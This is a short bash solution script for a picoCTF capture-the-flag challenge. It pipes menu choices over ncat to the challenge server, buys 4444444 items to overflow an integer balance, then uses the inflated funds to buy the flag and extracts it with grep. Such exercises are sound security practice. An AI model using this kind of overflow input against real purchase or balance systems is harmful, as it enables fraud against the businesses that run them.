#!/usr/bin/env bash

targetAddr='jupiter.challenges.picoctf.org'
targetPort=9745

# Overflow balance with large quantity of flags bought(4444444)
# then use our new funds to buy real flag
answer="2\n1\n4444444\n2\n2\n1\n3\n"
echo 'Flag: '$(ncat ${targetAddr} ${targetPort} < <(echo $answer) | grep -oP 'picoCTF{.*?}')
